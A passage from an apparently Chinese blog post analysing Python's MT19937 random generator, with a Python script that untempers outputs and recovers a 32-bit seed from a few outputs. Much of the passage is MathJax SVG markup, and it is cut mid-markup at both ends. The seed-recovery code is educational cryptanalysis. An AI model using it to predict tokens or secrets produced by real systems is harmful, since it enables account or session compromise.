143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"/></g></g></g></g></g></svg></mjx-container> 的MSB只影响 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex;" xmlns="http://www.w3.org/2000/svg" width="2.768ex" height="2.211ex" role="img" focusable="false" viewbox="0 -683 1223.3 977.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mi" transform="translate(882,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></g></svg></mjx-container> 的MSB==</p><p>如果Python的PRNG使用一个 32 位整数进行手动播种，那么只需要前 624 个输出中的任意 6 个，就可以恢复出该种子。</p><p>下面是验证代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">x, shift</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">x, shift, mask</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">v</span>):</span><br><span class="line">    v = unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    v = unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invertStep</span>(<span class="params">si, si227</span>):</span><br><span class="line">    <span class="comment"># S[i] ^ S[i-227] == (((I[i] &amp; 0x80000000) | (I[i+1] &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ (0x9908b0df if I[i+1] &amp; 1 else 0)</span></span><br><span class="line">    X = si ^ si227</span><br><span class="line">    <span class="comment"># we know the LSB of I[i+1] because MSB of 0x9908b0df is set, we can see if the XOR has been applied</span></span><br><span class="line">    mti1 = (X &amp; <span class="number">0x80000000</span>) &gt;&gt; <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> mti1:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line">    <span class="comment"># undo shift right</span></span><br><span class="line">    X &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="comment"># now recover MSB of state I[i]</span></span><br><span class="line">    mti = X &amp; <span class="number">0x80000000</span></span><br><span class="line">    <span class="comment"># recover the rest of state I[i+1]</span></span><br><span class="line">    mti1 += X &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> mti, mti1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_genrand</span>(<span class="params">seed</span>):</span><br><span class="line">    MT = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">    MT[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">623</span> + <span class="number">1</span>):  <span class="comment"># loop over each element</span></span><br><span class="line">        MT[i] = ((<span class="number">0x6c078965</span> * (MT[i - <span class="number">1</span>] ^ (MT[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>))) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> MT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_kj_from_Ji</span>(<span class="params">ji, ji1, i</span>):</span><br><span class="line">    <span class="comment"># ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># ji1 =&gt; J[i-1]</span></span><br><span class="line">    const = init_genrand(<span class="number">19650218</span>)</span><br><span class="line">    key = ji - (const[i] ^ ((ji1 ^ (ji1 &gt;&gt; <span class="number">30</span>)) * <span class="number">1664525</span>))</span><br><span class="line">    key &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return K[j] + j</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Ji_from_Ii</span>(<span class="params">Ii, Ii1, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    ji = (Ii + i) ^ ((Ii1 ^ (Ii1 &gt;&gt; <span class="number">30</span>)) * <span class="number">1566083941</span>)</span><br><span class="line">    ji &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return J[i]</span></span><br><span class="line">    <span class="keyword">return</span> ji</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Kj_from_Ii</span>(<span class="params">Ii, Ii1, Ii2, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    <span class="comment"># Ii2 =&gt; I[i-2]</span></span><br><span class="line">    <span class="comment"># Ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># Ji1 =&gt; J[i-1]</span></span><br><span class="line">    Ji = recover_Ji_from_Ii(Ii, Ii1, i)</span><br><span class="line">    Ji1 = recover_Ji_from_Ii(Ii1, Ii2, i-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> recover_kj_from_Ji(Ji, Ji1, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="comment"># k = 1</span></span><br><span class="line">    <span class="comment"># K = [i]</span></span><br><span class="line"></span><br><span class="line">    S = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"></span><br><span class="line">    I_227_, I_228 = invertStep(S[<span class="number">0</span>], S[<span class="number">227</span>])</span><br><span class="line">    I_228_, I_229 = invertStep(S[<span class="number">1</span>], S[<span class="number">228</span>])</span><br><span class="line">    I_229_, I_230 = invertStep(S[<span class="number">2</span>], S[<span class="number">229</span>])</span><br><span class="line"></span><br><span class="line">    I_228 += I_228_</span><br><span class="line">    I_229 += I_229_</span><br><span class="line"></span><br><span class="line">    <span class="comment"># two possibilities for I_230</span></span><br><span class="line">    seed1 = recover_Kj_from_Ii(I_230, I_229, I_228, <span class="number">230</span>)</span><br><span class="line">    seed2 = recover_Kj_from_Ii(I_230+<span class="number">0x80000000</span>, I_229, I_228, <span class="number">230</span>)</span><br><span class="line">    <span class="comment"># only the MSB differs</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(seed1), <span class="built_in">hex</span>(seed2))</span><br></pre></td></tr></table></figure><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250508170455.png" alt="微信截图_20250508170455"></p><p>上面我们所讨论的是恢复单个32位整数种子的推导过程，那么对于这种情况来说种子数组的长度是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.327ex" height="1.756ex" role="img" focusable="false" viewbox="0 -694 2354.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g><g data-mml-node="mo" transform="translate(798.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(1854.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></svg></mjx-container>，如果现在种子数组的长度是2呢？回想上面我们已经获得3个连续的初始状态，如果现在再利用一对当前状态反推出一组初始状态的 MSB 和低31位，我们就能继续恢复整个数组，无论恢复多少个初始状态只有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="1.735ex" height="1.902ex" role="img" focusable="false" viewbox="0 -683 767 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></g></svg></mjx-container>的MSB会缺失，因此这个状态都会存在两个值，这也就导致<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex;" xmlns="http://www.w3.org/2000/svg" width="2.768ex" height="2.211ex" role="img" focusable="false" viewbox="0 -683 1223.3 977.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g><g data-mml-node="mi" transform="translate(882,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"/></g></g></g></g></svg></mjx-container>存在两个可能的值</p><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250508172831.png" alt="微信截图_20250508172831"></p><p>原文章给出了在每种情形下恢复种子所需的最小输出数量，如下所示：</p><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250508173112.png" alt="微信截图_20250508173112"></p><p>下面我们将探究一个特殊的情况，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="7.589ex" height="1.756ex" role="img" focusable="false" viewbox="0 -694 3354.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"/></g><g data-mml-node="mo" transform="translate(798.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(1854.6,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"/></g></g></g></svg></mjx-container>，这种情况下我们只需要624个输出即可完成种子的恢复，因为随着关系对的不断加入，我们可以在他们之间建立更多的关系，从而降低恢复种子所需要的输出。</p><h2 id="从完整状态恢复种子"><a href="#从完整状态恢复种子" class="headerlink" title="从完整状态恢复种子"></a>从完整状态恢复种子</h2><p>状态更新操作可逆，知道完整的状态就足以从任何状态<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.459ex" height="1.645ex" role="img" focusable="false" viewbox="0 -705 645 727"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"/></g></g></g></svg></mjx-container>倒回 初始状态<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container></p><p>状态更新过程中仅使用了<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex;" xmlns="http://www.w3.org/2000/svg" width="1.983ex" height="1.92ex" role="img" focusable="false" viewbox="0 -683 876.6 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g><g data-mml-node="mn" transform="translate(473,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g></g></svg></mjx-container>的MSB，其他位均未被使用，因此我们无法去恢复这些确切的位，因为这个原因回溯后的状态在第一个值上将会有所不同</p><p>下面代码基于<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.674ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 3834 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(1278,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(2945,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/></g><g data-mml-node="mo" transform="translate(3445,0)"><path data-c="29" 